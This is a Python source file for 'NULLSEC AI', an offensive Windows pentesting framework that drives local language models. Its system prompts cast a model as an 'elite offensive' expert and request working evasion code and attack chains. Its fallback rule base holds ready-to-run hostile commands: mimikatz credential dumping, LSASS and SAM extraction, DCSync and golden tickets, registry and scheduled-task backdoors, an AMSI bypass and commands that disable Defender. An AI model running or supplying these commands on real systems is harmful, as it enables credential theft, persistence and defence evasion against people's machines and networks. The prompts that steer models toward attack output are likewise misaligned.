#!/usr/bin/env python3
"""
NULLSEC FRAMEWORK AI v3.0 - WINDOWS EDITION
═══════════════════════════════════════════════════════════════════════════════
Offline-First AI-Powered Security Operations for Windows

Features:
- NO API Keys Required - Works 100% offline
- Multiple Local AI Models for pentesting
- Windows-native path handling
- Ollama for Windows integration
- PowerShell command generation
- Windows-specific attack guidance

Supported Models (All Free & Open Source):
- DeepSeek Coder 6.7B - Code generation specialist
- CodeLlama 13B - Meta's code model
- Mistral 7B - Fast general purpose
- Mixtral 8x7B - Expert mixture model
- And more...

Author: bad-antics development
GitHub: github.com/bad-antics
License: For authorized security testing only
"""

import os
import sys
import subprocess
import json
import time
import sqlite3
import platform
from typing import Optional, Dict, List, Any
from datetime import datetime
from pathlib import Path

# Detect Windows
IS_WINDOWS = platform.system() == 'Windows'

# Windows ANSI color support
if IS_WINDOWS:
    os.system('')  # Enable ANSI escape codes on Windows 10+

# NULLSEC Colors
class Colors:
    RED = '\033[1;31m'
    GREEN = '\033[1;32m'
    YELLOW = '\033[1;33m'
    CYAN = '\033[1;36m'
    MAGENTA = '\033[1;35m'
    WHITE = '\033[1;37m'
    BLUE = '\033[1;34m'
    DIM = '\033[2m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

# Windows-compatible paths
SCRIPT_DIR = Path(__file__).parent.absolute()
CONFIG_FILE = SCRIPT_DIR / '.nullsec-ai-v3.json'
DB_FILE = SCRIPT_DIR / '.nullsec-ai-v3.db'

# Local AI Configuration - Windows Edition
LOCAL_AI_PROVIDERS = {
    'ollama': {
        'host': os.getenv('OLLAMA_HOST', 'http://localhost:11434'),
        'check_cmd': ['ollama', 'list'] if IS_WINDOWS else ['ollama', 'list'],
        'models': [
            'deepseek-coder:6.7b',
            'codellama:13b',
            'mistral:7b',
            'mixtral:8x7b',
            'openhermes:7b',
            'solar:10.7b',
            'phi:2.7b',
            'orca2:13b',
            'neural-chat:7b',
        ]
    },
    'lmstudio': {
        'host': 'http://localhost:1234',
        'check_cmd': None,
        'models': ['local-model']
    },
    'gpt4all': {
        'host': 'http://localhost:4891',
        'check_cmd': None,
        'models': ['orca-mini', 'wizardlm', 'falcon']
    }
}

# Windows-specific attack prompts
ATTACK_PROMPTS = {
    "windows": """You are an elite Windows penetration testing AI with deep expertise in Windows security.

Core capabilities:
- Active Directory: BloodHound, SharpHound, Rubeus, mimikatz
- Privilege Escalation: UAC bypass, token manipulation, service exploitation
- Credential Attacks: LSASS dumping, SAM extraction, Kerberoasting
- Lateral Movement: PsExec, WMI, WinRM, Pass-the-Hash
- Persistence: Registry, Scheduled Tasks, Services, DLL hijacking
- Evasion: AMSI bypass, Defender evasion, AppLocker bypass

Provide working PowerShell commands and tools with explanations.""",

    "active_directory": """You are an Active Directory security expert specializing in AD exploitation.

Core capabilities:
- Enumeration: BloodHound, ADRecon, PowerView
- Kerberos: Kerberoasting, AS-REP roasting, Golden/Silver tickets
- Delegation: Constrained/Unconstrained delegation abuse
- ACL Attacks: DCSync, WriteDACL, GenericAll abuse
- Certificate Services: ESC1-ESC8 attacks, Certify, Certipy
- Trust Attacks: Cross-forest attacks, SID history injection

Provide complete attack chains with PowerShell/C# tooling.""",

    "network": """You are an elite network penetration testing AI.

Core capabilities:
- Port scanning: nmap, masscan (Windows ports)
- Service enumeration: NetBIOS, SMB, RDP, WinRM
- Protocol exploitation: SMB relay, LLMNR/NBT-NS poisoning
- Network pivoting: chisel, ligolo-ng, SSH tunneling
- Traffic analysis: Wireshark, tcpdump (via WSL)
- MITM attacks: Responder, Inveigh

Provide Windows-compatible commands.""",

    "web": """You are an elite web application security expert.

Core capabilities:
- SQL Injection: Manual and sqlmap
- XSS: All types with payloads
- Directory fuzzing: gobuster, ffuf, feroxbuster
- Authentication bypass: JWT, session manipulation
- File upload: webshells, path traversal
- API testing: REST, GraphQL

Provide complete attack chains with working payloads.""",

    "credentials": """You are a Windows credential attack specialist.

Core capabilities:
- LSASS Dumping: mimikatz, procdump, comsvcs.dll
- SAM/SYSTEM: reg save, secretsdump
- Password cracking: hashcat, john
- Kerberos: Rubeus, Impacket
- Token manipulation: Incognito, TokenPlayer
- Pass-the-Hash: mimikatz, Impacket, CrackMapExec

Provide optimized Windows credential attack strategies.""",

    "evasion": """You are a Windows evasion expert specializing in defense bypass.

Core capabilities:
- AMSI Bypass: Patching, reflection, string obfuscation
- Defender Evasion: Exclusions, process injection, syscalls
- AppLocker Bypass: Trusted paths, MSBuild, InstallUtil
- UAC Bypass: fodhelper, eventvwr, computerdefaults
- ETW Patching: Event tracing bypass
- CLM Bypass: Constrained Language Mode escape

Provide working evasion techniques with code.""",

    "general": """You are NULLSEC AI for Windows, an elite offensive security expert.

You provide:
1. Windows-specific attack commands
2. PowerShell exploitation techniques
3. Active Directory attacks
4. Credential harvesting methods
5. Evasion and OPSEC guidance

Focus on practical Windows penetration testing solutions."""
}

# Windows-specific rule-based expert system
class WindowsExpert:
    """Offline Windows security expert system"""
    
    def __init__(self):
        self.rules = self._load_rules()
    
    def _load_rules(self) -> Dict:
        """Load Windows pentesting rules"""
        return {
            "enumeration": {
                "system_info": "systeminfo && hostname && whoami /all",
                "network_info": "ipconfig /all && netstat -ano",
                "users": "net user && net localgroup administrators",
                "domain_info": "nltest /dclist: && net user /domain",
                "running_services": "wmic service list brief | findstr Running",
                "installed_software": "wmic product get name,version",
            },
            "privilege_escalation": {
                "check_tokens": "whoami /priv",
                "unquoted_paths": 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\\\" | findstr /i /v \\"',
                "weak_services": "accesschk.exe -uwcqv \"Everyone\" * /accepteula",
                "scheduled_tasks": "schtasks /query /fo LIST /v",
                "autologon": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"",
            },
            "credential_access": {
                "sam_dump": "reg save HKLM\\SAM sam.hive && reg save HKLM\\SYSTEM system.hive",
                "mimikatz_logonpasswords": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
                "comsvcs_dump": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <lsass_pid> lsass.dmp full",
                "cached_creds": "reg query \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v CachedLogonsCount",
            },
            "lateral_movement": {
                "psexec": "psexec.exe \\\\<target> -u <user> -p <pass> cmd.exe",
                "wmi": "wmic /node:<target> /user:<user> /password:<pass> process call create \"cmd.exe /c <command>\"",
                "winrm": "Enter-PSSession -ComputerName <target> -Credential <domain\\user>",
                "smbexec": "python smbexec.py <domain>/<user>:<pass>@<target>",
            },
            "persistence": {
                "registry_run": 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Backdoor /t REG_SZ /d "C:\\backdoor.exe"',
                "scheduled_task": "schtasks /create /tn \"Updater\" /tr \"C:\\backdoor.exe\" /sc onlogon",
                "service": "sc create backdoorsvc binpath= \"C:\\backdoor.exe\" start= auto",
                "wmi_event": "WMI Event Subscription persistence (requires PowerShell script)",
            },
            "active_directory": {
                "bloodhound_collect": "SharpHound.exe -c All --zipfilename loot.zip",
                "kerberoast": "Rubeus.exe kerberoast /outfile:hashes.txt",
                "asreproast": "Rubeus.exe asreproast /outfile:asrep.txt",
                "dcsync": 'mimikatz.exe "lsadump::dcsync /domain:<domain> /user:krbtgt" exit',
                "golden_ticket": 'mimikatz.exe "kerberos::golden /domain:<domain> /sid:<sid> /krbtgt:<hash> /user:Administrator /ptt" exit',
            },
            "evasion": {
                "amsi_bypass": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
                "defender_exclude": "Add-MpPreference -ExclusionPath 'C:\\Tools'",
                "disable_defender": "Set-MpPreference -DisableRealtimeMonitoring $true",
                "applocker_bypass": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe payload.xml",
            }
        }
    
    def get_commands(self, query: str, target: str = "") -> List[str]:
        """Generate Windows commands based on query"""
        commands = []
        query_lower = query.lower()
        
        if any(word in query_lower for word in ['enum', 'info', 'recon', 'discover']):
            commands.extend([
                self.rules['enumeration']['system_info'],
                self.rules['enumeration']['users'],
            ])
        
        if any(word in query_lower for word in ['privesc', 'privilege', 'escalate', 'root', 'admin']):
            commands.extend([
                self.rules['privilege_escalation']['check_tokens'],
                self.rules['privilege_escalation']['unquoted_paths'],
            ])
        
        if any(word in query_lower for word in ['cred', 'password', 'hash', 'mimikatz', 'dump']):
            commands.extend([
                self.rules['credential_access']['mimikatz_logonpasswords'],
                self.rules['credential_access']['sam_dump'],
            ])
        
        if any(word in query_lower for word in ['lateral', 'move', 'pivot', 'psexec', 'wmi']):
            commands.extend([
                self.rules['lateral_movement']['psexec'].replace('<target>', target or '<target>'),
                self.rules['lateral_movement']['winrm'].replace('<target>', target or '<target>'),
            ])
        
        if any(word in query_lower for word in ['persist', 'backdoor', 'maintain']):
            commands.extend([
                self.rules['persistence']['registry_run'],
                self.rules['persistence']['scheduled_task'],
            ])
        
        if any(word in query_lower for word in ['ad', 'active directory', 'domain', 'kerberos', 'bloodhound']):
            commands.extend([
                self.rules['active_directory']['bloodhound_collect'],
                self.rules['active_directory']['kerberoast'],
            ])
        
        if any(word in query_lower for word in ['bypass', 'amsi', 'evasion', 'defender', 'av']):
            commands.extend([
                self.rules['evasion']['amsi_bypass'],
                self.rules['evasion']['defender_exclude'],
            ])
        
        return commands if commands else [
            "# No specific rules matched. Try:",
            self.rules['enumeration']['system_info'],
        ]
    
    def get_advice(self, query: str) -> str:
        """Get Windows pentesting advice"""
        query_lower = query.lower()
        
        if 'start' in query_lower or 'begin' in query_lower:
            return """WINDOWS PENETRATION TESTING METHODOLOGY:

1. ENUMERATION
   - systeminfo, hostname, whoami /all
   - net user, net group, net localgroup
   - ipconfig /all, netstat -ano, route print
   
2. PRIVILEGE ESCALATION
   - Token privileges: whoami /priv
   - Unquoted service paths
   - Weak service permissions
   - AlwaysInstallElevated
   - Scheduled tasks

3. CREDENTIAL ACCESS
   - SAM/SYSTEM extraction
   - LSASS memory dump
   - Mimikatz sekurlsa::logonpasswords
   - Kerberoasting, AS-REP Roasting

4. LATERAL MOVEMENT
   - PsExec, WMI, WinRM
   - Pass-the-Hash
   - Token impersonation

5. ACTIVE DIRECTORY
   - BloodHound enumeration
   - DCSync attack
   - Golden/Silver tickets"""

        elif 'mimikatz' in query_lower:
            return """MIMIKATZ USAGE GUIDE:

# Enable debug privilege
privilege::debug

# Dump logon passwords
sekurlsa::logonpasswords

# Dump Kerberos tickets
sekurlsa::tickets /export

# DCSync attack
lsadump::dcsync /domain:corp.local /user:Administrator

# Pass-the-Hash
sekurlsa::pth /user:Admin /domain:corp /ntlm:<hash> /run:cmd

# Golden Ticket
kerberos::golden /domain:corp.local /sid:<SID> /krbtgt:<hash> /user:Administrator /ptt"""

        elif 'amsi' in query_lower or 'bypass' in query_lower:
            return """AMSI BYPASS TECHNIQUES:

1. PowerShell AMSI Bypass:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

2. Memory Patching (Cobalt Strike style):
$a = [Ref].Assembly.GetTypes()
# ... (patch AmsiScanBuffer)

3. Obfuscation:
$w = 'System.Management.Automation.A]msiUtils'
# ... (string manipulation)

4. Defender Exclusion:
Add-MpPreference -ExclusionPath 'C:\\Tools'

5. Disable Real-time Protection (requires admin):
Set-MpPreference -DisableRealtimeMonitoring $true"""

        else:
            return """NULLSEC AI - WINDOWS OFFLINE MODE

Operating in offline mode. I can help with:

1. Windows enumeration commands
2. Privilege escalation techniques
3. Credential harvesting methods
4. Active Directory attacks
5. Evasion techniques

For AI-powered assistance, install Ollama for Windows:
  winget install Ollama.Ollama
  ollama pull deepseek-coder:6.7b"""


class AttackKnowledgeBase:
    """SQLite-based knowledge base"""
    
    def __init__(self, db_path: Path):
        self.db_path = str(db_path)
        self._init_db()
    
    def _init_db(self):
        """Initialize database schema"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target TEXT,
                category TEXT,
                start_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'active'
            )
        """)
        
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id INTEGER,
                command TEXT,
                output TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        conn.commit()
        conn.close()
    
    def create_session(self, target: str, category: str = "general") -> int:
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute("INSERT INTO sessions (target, category) VALUES (?, ?)", (target, category))
        session_id = cursor.lastrowid
        conn.commit()
        conn.close()
        return session_id
    
    def log_command(self, session_id: int, command: str, output: str = ""):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute("INSERT INTO commands (session_id, command, output) VALUES (?, ?, ?)",
                      (session_id, command, output[:10000]))
        conn.commit()
        conn.close()


class NullsecAI:
    """Windows AI system with offline-first approach"""
    
    def __init__(self):
        self.config = self._load_config()
        self.kb = AttackKnowledgeBase(DB_FILE)
        self.expert = WindowsExpert()
        self.current_target = None
        self.current_session = None
        self.context_buffer = []
        
        # Detect available AI providers
        self.available_providers = self._detect_providers()
        
        print(f"\n{Colors.CYAN}[*] NULLSEC AI v3.0 - Windows Edition{Colors.RESET}")
        print(f"{Colors.DIM}[*] NO API KEYS REQUIRED - Works 100% offline{Colors.RESET}\n")
        
        if self.available_providers:
            print(f"{Colors.GREEN}[+] Available AI providers:{Colors.RESET}")
            for provider, models in self.available_providers.items():
                print(f"    {Colors.CYAN}• {provider}:{Colors.RESET} {len(models)} models")
        else:
            print(f"{Colors.YELLOW}[!] No AI providers detected - using Windows expert system{Colors.RESET}")
            print(f"{Colors.DIM}[*] For AI support, install Ollama: winget install Ollama.Ollama{Colors.RESET}")
        
        print()
    
    def _load_config(self) -> Dict:
        if CONFIG_FILE.exists():
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        else:
            config = {
                "preferred_provider": "ollama",
                "preferred_model": "deepseek-coder:6.7b",
                "temperature": 0.7,
                "max_tokens": 2000,
            }
            with open(CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=2)
            return config
    
    def _detect_providers(self) -> Dict[str, List[str]]:
        """Detect available local AI providers"""
        available = {}
        
        for provider, config in LOCAL_AI_PROVIDERS.items():
            try:
                if provider == 'ollama':
                    if IS_WINDOWS:
                        result = subprocess.run(
                            ['ollama', 'list'],
                            capture_output=True,
                            text=True,
                            timeout=5,
                            creationflags=subprocess.CREATE_NO_WINDOW if IS_WINDOWS else 0
                        )
                    else:
                        result = subprocess.run(
                            ['ollama', 'list'],
                            capture_output=True,
                            text=True,
                            timeout=5
                        )
                    
                    if result.returncode == 0:
                        models = []
                        for line in result.stdout.split('\n')[1:]:
                            if line.strip():
                                model_name = line.split()[0]
                                models.append(model_name)
                        if models:
                            available['ollama'] = models
                
                elif provider in ['lmstudio', 'gpt4all']:
                    import urllib.request
                    try:
                        urllib.request.urlopen(config['host'], timeout=2)
                        available[provider] = config['models']
                    except:
                        pass
            except:
                pass
        
        return available
    
    def execute_with_local_ai(self, prompt: str, system_prompt: str = "") -> Optional[str]:
        """Execute prompt with local AI"""
        provider = self.config.get("preferred_provider", "ollama")
        
        if provider not in self.available_providers:
            return None
        
        if provider == 'ollama':
            return self._execute_ollama(prompt, system_prompt)
        
        return None
    
    def _execute_ollama(self, prompt: str, system_prompt: str = "") -> Optional[str]:
        """Execute with Ollama"""
        model = self.config.get("preferred_model", "deepseek-coder:6.7b")
        
        if model not in self.available_providers.get('ollama', []):
            ollama_models = self.available_providers.get('ollama', [])
            if ollama_models:
                model = ollama_models[0]
                print(f"{Colors.YELLOW}[!] Using model: {model}{Colors.RESET}")
            else:
                return None
        
        try:
            import requests
            
            full_prompt = f"{system_prompt}\n\n{prompt}" if system_prompt else prompt
            
            response = requests.post(
                f"{LOCAL_AI_PROVIDERS['ollama']['host']}/api/generate",
                json={
                    "model": model,
                    "prompt": full_prompt,
                    "stream": False,
                    "options": {
                        "temperature": self.config.get("temperature", 0.7),
                        "num_predict": self.config.get("max_tokens", 2000)
                    }
                },
                timeout=120
            )
            
            if response.status_code == 200:
                result = response.json()
                return result.get('response', '')
        except Exception as e:
            print(f"{Colors.RED}[!] Ollama error: {e}{Colors.RESET}")
        
        return None
    
    def query(self, prompt: str, category: str = "general") -> str:
        """Main query interface"""
        
        system_prompt = ATTACK_PROMPTS.get(category, ATTACK_PROMPTS["general"])
        
        if self.current_target:
            system_prompt += f"\n\nCurrent target: {self.current_target}"
        
        # Try AI first
        response = self.execute_with_local_ai(prompt, system_prompt)
        
        if response:
            return response
        
        # Fallback to Windows expert system
        print(f"{Colors.YELLOW}[!] Using Windows expert system (no AI available){Colors.RESET}\n")
        
        commands = self.expert.get_commands(prompt, self.current_target or "")
        advice = self.expert.get_advice(prompt)
        
        result = f"{advice}\n\n"
        if commands:
            result += f"SUGGESTED COMMANDS:\n"
            for cmd in commands:
                result += f"  {cmd}\n"
        
        return result
    
    def interactive_mode(self):
        """Interactive AI assistant mode"""
        print(f"""
{Colors.RED}{'='*80}{Colors.RESET}
{Colors.WHITE}  NULLSEC AI v3.0 - WINDOWS INTERACTIVE MODE{Colors.RESET}
{Colors.RED}{'='*80}{Colors.RESET}

{Colors.GREEN}Available Commands:{Colors.RESET}
  {Colors.CYAN}set target <ip/hostname>{Colors.RESET}  - Set current target
  {Colors.CYAN}set category <name>{Colors.RESET}       - Set attack category
  {Colors.CYAN}models{Colors.RESET}                     - List available AI models
  {Colors.CYAN}install <model>{Colors.RESET}            - Install Ollama model
  {Colors.CYAN}execute <cmd>{Colors.RESET}              - Execute command
  {Colors.CYAN}powershell{Colors.RESET}                 - Launch PowerShell
  {Colors.CYAN}history{Colors.RESET}                    - Show session history
  {Colors.CYAN}clear{Colors.RESET}                      - Clear screen
  {Colors.CYAN}help{Colors.RESET}                       - Show this help
  {Colors.CYAN}exit{Colors.RESET}                       - Exit AI mode

{Colors.YELLOW}Categories:{Colors.RESET} windows, active_directory, network, web, credentials, evasion, general

{Colors.DIM}{'='*80}{Colors.RESET}
""")
        
        category = "windows"
        
        while True:
            try:
                # Regular prompt style
                if self.current_target:
                    prompt_text = f"\n{Colors.GREEN}┌──({Colors.RED}nullsec-ai{Colors.GREEN})-[{Colors.CYAN}{category}{Colors.GREEN}]-[{Colors.WHITE}{self.current_target}{Colors.GREEN}]\n└─{Colors.RED}$ {Colors.RESET}"
                else:
                    prompt_text = f"\n{Colors.GREEN}┌──({Colors.RED}nullsec-ai{Colors.GREEN})-[{Colors.CYAN}{category}{Colors.GREEN}]\n└─{Colors.RED}$ {Colors.RESET}"
                
                user_input = input(prompt_text).strip()
                
                if not user_input:
                    continue
                
                if user_input.lower() in ['exit', 'quit', 'q']:
                    break
                
                elif user_input.lower() == 'clear':
                    os.system('cls' if IS_WINDOWS else 'clear')
                    continue
                
                elif user_input.lower() == 'powershell':
                    subprocess.run(['powershell', '-ExecutionPolicy', 'Bypass', '-NoProfile', '-NoExit'])
                    continue
                
                elif user_input.lower() == 'help':
                    print(self.query("help me get started with Windows penetration testing", category))
                    continue
                
                elif user_input.lower().startswith('set target '):
                    self.current_target = user_input[11:].strip()
                    print(f"{Colors.GREEN}[+] Target set to: {self.current_target}{Colors.RESET}")
                    if self.current_target:
                        self.current_session = self.kb.create_session(self.current_target, category)
                    continue
                
                elif user_input.lower().startswith('set category '):
                    category = user_input[13:].strip()
                    print(f"{Colors.GREEN}[+] Category set to: {category}{Colors.RESET}")
                    continue
                
                elif user_input.lower() == 'models':
                    self.list_models()
                    continue
                
                elif user_input.lower().startswith('install '):
                    model = user_input[8:].strip()
                    self.install_model(model)
                    continue
                
                elif user_input.lower().startswith('execute '):
                    cmd = user_input[8:].strip()
                    self.execute_command(cmd)
                    continue
                
                elif user_input.lower() == 'history':
                    for i, entry in enumerate(self.context_buffer[-10:], 1):
                        print(f"{Colors.DIM}{i}. {entry[:100]}...{Colors.RESET}")
                    continue
                
                # AI query
                print(f"\n{Colors.CYAN}[AI Response]{Colors.RESET}\n")
                response = self.query(user_input, category)
                print(response)
                print()
                
                self.context_buffer.append(f"Q: {user_input}\nA: {response[:200]}")
                
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}[!] Use 'exit' to quit{Colors.RESET}")
            except Exception as e:
                print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")
        
        print(f"\n{Colors.GREEN}[+] Exiting NULLSEC AI{Colors.RESET}\n")
    
    def list_models(self):
        """List available AI models"""
        if not self.available_providers:
            print(f"{Colors.YELLOW}[!] No AI providers detected{Colors.RESET}")
            print(f"\n{Colors.CYAN}To install Ollama for Windows:{Colors.RESET}")
            print(f"  winget install Ollama.Ollama")
            print(f"  ollama pull deepseek-coder:6.7b")
            return
        
        print(f"\n{Colors.GREEN}[+] Available AI Models:{Colors.RESET}\n")
        for provider, models in self.available_providers.items():
            print(f"{Colors.CYAN}{provider}:{Colors.RESET}")
            for model in models:
                marker = "→" if model == self.config.get("preferred_model") else " "
                print(f"  {marker} {model}")
        print()
    
    def install_model(self, model: str):
        """Install Ollama model"""
        print(f"{Colors.CYAN}[*] Installing {model}...{Colors.RESET}")
        try:
            subprocess.run(['ollama', 'pull', model], check=True)
            print(f"{Colors.GREEN}[+] Model installed successfully{Colors.RESET}")
            self.available_providers = self._detect_providers()
        except Exception as e:
            print(f"{Colors.RED}[!] Installation failed: {e}{Colors.RESET}")
    
    def execute_command(self, cmd: str):
        """Execute shell command"""
        print(f"{Colors.DIM}[>] {cmd}{Colors.RESET}\n")
        try:
            if IS_WINDOWS:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
            else:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
            
            if result.stdout:
                print(result.stdout)
            if result.stderr:
                print(f"{Colors.YELLOW}{result.stderr}{Colors.RESET}")
            
            if self.current_session:
                self.kb.log_command(self.current_session, cmd, result.stdout)
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")


def main():
    """Main entry point"""
    ai = NullsecAI()
    ai.interactive_mode()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.RED}[!] Interrupted{Colors.RESET}\n")
        sys.exit(0)
